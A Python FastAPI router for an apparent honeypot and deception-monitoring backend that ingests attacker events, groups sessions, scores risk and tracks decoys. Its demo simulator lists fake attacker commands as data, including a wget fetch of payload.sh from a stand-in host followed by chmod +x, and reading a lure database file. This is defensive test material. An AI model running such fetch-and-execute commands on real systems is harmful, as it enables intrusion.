import random
import time
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, Header, HTTPException

from app import database as db
from app.core import config
from app.models.schemas import Heartbeat, SecurityEvent
from app.services import adapter
from app.services.analysis import analyze_session, classify_session

router = APIRouter(prefix="/api")
DECOYS = {}          # name -> heartbeat info (kept in memory)
DECOY_TIMEOUT = 30   # seconds without heartbeat = offline


def require_key(x_ingest_key: str | None = Header(default=None)):
    if config.INGEST_KEY and x_ingest_key != config.INGEST_KEY:
        raise HTTPException(status_code=401, detail="Bad ingest key")


def process_event(record):
    """Save one event, then let the adaptive engine react to it."""
    saved = db.save_event(record)
    adaptations = adapter.evaluate(saved["source_ip"], saved["session_id"])
    return {"event": saved, "adaptations": adaptations}


def build_sessions(limit=5000):
    events = db.get_events(limit=limit)
    events.reverse()  # oldest first
    grouped = {}
    for e in events:
        grouped.setdefault(e["session_id"], []).append(e)
    sessions = [{
        "session_id": sid,
        "event_count": len(evs),
        "source_ips": sorted({e["source_ip"] for e in evs}),
        "first_seen": evs[0]["timestamp"],
        "last_seen": evs[-1]["timestamp"],
        "analysis": classify_session(evs),
    } for sid, evs in grouped.items()]
    sessions.sort(key=lambda s: s["last_seen"], reverse=True)
    return sessions


def _parse(ts):
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except (AttributeError, ValueError):
        return None


def avg_delay_ms(events):
    delays = []
    for e in events:
        a, b = _parse(e.get("timestamp")), _parse(e.get("received_at"))
        if a and b and a.tzinfo and b.tzinfo:
            delays.append(max(0, (b - a).total_seconds() * 1000))
    return round(sum(delays) / len(delays), 1) if delays else None


# ---------- health ----------

@router.get("/health")
def health():
    return {"status": "healthy", "stored_events": db.get_event_count(),
            "ollama_model": config.OLLAMA_MODEL, "database": "SQLite"}


# ---------- events ----------

@router.post("/events", dependencies=[Depends(require_key)])
def ingest_event(event: SecurityEvent):
    result = process_event(event.model_dump(mode="json"))
    return {"message": "Event recorded", **result}


@router.get("/events")
def list_events(limit: int = 200, session_id: str | None = None,
                event_type: str | None = None):
    events = db.get_events(min(limit, 1000), session_id, event_type)
    return {"count": len(events), "events": events}


# ---------- sessions & analysis ----------

@router.get("/sessions")
def list_sessions():
    sessions = build_sessions()
    return {"count": len(sessions), "sessions": sessions}


@router.get("/sessions/{session_id}")
def session_detail(session_id: str):
    events = db.get_events_for_session(session_id)
    if not events:
        raise HTTPException(status_code=404, detail="Session not found")
    ips = {e["source_ip"] for e in events}
    adaptations = [a for ip in ips for a in db.get_adaptations_for_ip(ip)
                   if a["session_id"] == session_id]
    return {
        "session_id": session_id,
        "source_ips": sorted(ips),
        "events": events,
        "analysis": classify_session(events),
        "adaptations": adaptations,
        "ai": db.get_analysis(session_id),
    }


@router.post("/analyze/{session_id}")
async def analyze(session_id: str, refresh: bool = False):
    events = db.get_events_for_session(session_id)
    if not events:
        raise HTTPException(status_code=404, detail="Session not found")
    cached = db.get_analysis(session_id)
    if cached and cached["event_count"] == len(events) and not refresh:
        return {"session_id": session_id, **cached}
    result = await analyze_session(events)
    db.save_analysis(session_id, len(events), result)
    return {"session_id": session_id, **db.get_analysis(session_id)}


# ---------- dashboard stats ----------

@router.get("/stats")
def stats():
    sessions = build_sessions()
    risk = {"high": 0, "medium": 0, "low": 0}
    for s in sessions:
        risk[s["analysis"]["rule_based_risk"]] += 1
    recent = db.get_events(limit=100)
    return {
        "total_events": db.get_event_count(),
        "total_sessions": len(sessions),
        "high_risk_sessions": risk["high"],
        "adaptations": len(db.get_adaptations(limit=10000)),
        "avg_ingest_delay_ms": avg_delay_ms(recent),
        "risk_distribution": [{"risk": k, "sessions": v}
                              for k, v in risk.items()],
        "timeline": db.get_timeline(30),
        "top_ips": db.get_top("source_ip"),
        "top_usernames": db.get_top("username"),
        "top_commands": db.get_top("command"),
    }


# ---------- adaptive deception ----------

@router.get("/adaptations")
def list_adaptations(limit: int = 100):
    items = db.get_adaptations(min(limit, 500))
    return {"count": len(items), "adaptations": items}


@router.get("/deception/state", dependencies=[Depends(require_key)])
def deception_state(ip: str):
    return adapter.deception_state(ip)


# ---------- decoy status ----------

@router.post("/decoys/heartbeat", dependencies=[Depends(require_key)])
def heartbeat(beat: Heartbeat):
    DECOYS[beat.name] = {**beat.model_dump(), "last_seen": time.time()}
    return {"ok": True}


@router.get("/decoys")
def decoys():
    now = time.time()
    return {"decoys": [{
        "name": d["name"], "kind": d["kind"], "port": d["port"],
        "status": "online" if now - d["last_seen"] < DECOY_TIMEOUT
        else "offline",
        "seconds_since_seen": round(now - d["last_seen"]),
    } for d in DECOYS.values()]}


# ---------- demo helpers ----------

ATTACK_SCRIPTS = {
    "brute_force": [
        ("login_attempt", "root", None, "Failed SSH login"),
        ("login_attempt", "root", None, "Failed SSH login"),
        ("login_attempt", "admin", None, "Failed SSH login"),
        ("login_attempt", "admin", None, "Failed SSH login"),
        ("login_attempt", "test", None, "Failed SSH login"),
        ("login_success", "admin", None, "Login accepted by decoy"),
    ],
    "recon_and_download": [
        ("service_scan", None, None, "Multiple service ports probed"),
        ("login_success", "root", None, "Login accepted by decoy"),
        ("command", "root", "whoami", "Command in fake shell"),
        ("resource_discovery", "root", "find /tmp -type f", "Discovery"),
        ("file_download", "root", "wget example.invalid/payload.sh",
         "Suspicious download"),
        ("command", "root", "chmod +x payload.sh", "Making it executable"),
    ],
    "data_theft": [
        ("login_success", "admin", None, "Login accepted by decoy"),
        ("resource_discovery", "admin", "ls /home/admin", "Discovery"),
        ("resource_discovery", "admin", "cat /home/admin/backup_db.sql",
         "Opened lure file"),
    ],
    "quiet_scan": [
        ("service_scan", None, None, "Port scan from a single host"),
    ],
}


@router.post("/simulate")
def simulate_attack():
    name = random.choice(list(ATTACK_SCRIPTS))
    session_id = f"sim-{name}-{random.randint(1000, 9999)}"
    ip = f"192.0.2.{random.randint(1, 254)}"  # TEST-NET, never routable
    saved, adaptations = [], []
    for etype, user, command, details in ATTACK_SCRIPTS[name]:
        event = SecurityEvent(source_ip=ip, session_id=session_id,
                              event_type=etype, username=user,
                              command=command, details=details)
        result = process_event(event.model_dump(mode="json"))
        saved.append(result["event"])
        adaptations += result["adaptations"]
    return {"scenario": name, "session_id": session_id,
            "events": saved, "adaptations": adaptations}


@router.post("/reset")
def reset():
    db.reset_all()
    return {"message": "All events, adaptations and analyses deleted"}
